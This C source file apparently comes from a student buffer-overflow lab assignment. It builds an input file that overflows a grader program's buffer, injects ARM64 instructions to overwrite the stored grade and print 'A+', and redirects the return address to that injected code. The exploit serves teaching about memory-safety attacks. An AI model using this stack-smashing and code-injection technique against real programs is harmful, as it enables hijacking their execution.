/*
   createdataAplus.c
   Ben Zhou and Owen Clarke
*/

/*
   Produces a file called dataAplus with the shortened student names
   OB; null bytes for padding; a format string; instructions for
   overwriting the grade to a null byte, printing A+, and linking
   back to the prinf; additional null byte padding; and an overwritten
   return address to our injected instructions.
*/

#include <stdio.h>
#include "miniassembler.h"
#include <string.h>

/*
   main does not accept any command-line arguments or read from stdin,
   but writes to dataAplus as described in the file comment above
*/
int main(void)
{
    FILE *f;
    unsigned long pc;
    unsigned int instr;
    int i;

    /* Memory addresses found in the grader’s memory map */
    const unsigned long NAME_ADDR = 0x420058UL;
    const unsigned long GRADE_ADDR = 0x420044UL;
    const unsigned long PRINT_ADDR = 0x40089cUL;
    unsigned long returnAddr = 0x420058UL + 8;

    /* Memory address of start of printf */
    const unsigned long PRINTF_ADDR = 0x400690;

    f = fopen("dataAplus", "w");

    /* Student initials: 2 bytes */
    fprintf(f, "%s", "OB");

    /* Null bytes for terminating string and padding */
    for (i = 0; i < 2; i++)
    {
        fprintf(f, "%c", '\0');
    }

    /* Format string to reference for printf calls */
    fprintf(f, "%c", '%');
    fprintf(f, "%c", 'c');

    /* Null byte padding */
    for (i = 0; i < 2; i++)
    {
        fprintf(f, "%c", '\0');
    }

    /* Counter starts after 2 name bytes, 2 bytes of format string,
    and 4 null bytes */
    pc = NAME_ADDR + 8;

    /* x0 <- &grade */
    instr = MiniAssembler_adr(0, GRADE_ADDR, pc);
    fwrite(&instr, 4, 1, f);
    pc += 4;

    /* w1 <- 'A' */
    instr = MiniAssembler_mov(1, (int)'\0');
    fwrite(&instr, 4, 1, f);
    pc += 4;

    /* *(&grade) = 'A' */
    instr = MiniAssembler_strb(1, 0);
    fwrite(&instr, 4, 1, f);
    pc += 4;

    /* x0 <- address of start of format string */
    instr = MiniAssembler_ldr(0, NAME_ADDR + 4, pc);
    fwrite(&instr, 4, 1, f);
    pc += 4;

    /* w1 <- 'A' */
    instr = MiniAssembler_mov(1, (int)'A');
    fwrite(&instr, 4, 1, f);
    pc += 4;

    /* bl to printf to print A */
    instr = MiniAssembler_bl(PRINTF_ADDR, pc);
    fwrite(&instr, 4, 1, f);
    pc += 4;

    /* w1 <- '+' */
    instr = MiniAssembler_mov(1, (int)'+');
    fwrite(&instr, 4, 1, f);
    pc += 4;

    /* bl to printf to print + */
    instr = MiniAssembler_bl(PRINTF_ADDR, pc);
    fwrite(&instr, 4, 1, f);
    pc += 4;

    /* jump into grader’s printf */
    instr = MiniAssembler_b(PRINT_ADDR, pc);
    fwrite(&instr, 4, 1, f);
    pc += 4;

    /* More padding to fill up 48 bytes of buffer */
    for (i = 0; i < 4; i++)
    {
        fprintf(f, "%c", '\0');
    }

    /* Overwritten return address to execute our injected
    instructions */
    fwrite(&returnAddr, sizeof(PRINT_ADDR), 1, f);

    fclose(f);
    return 0;
}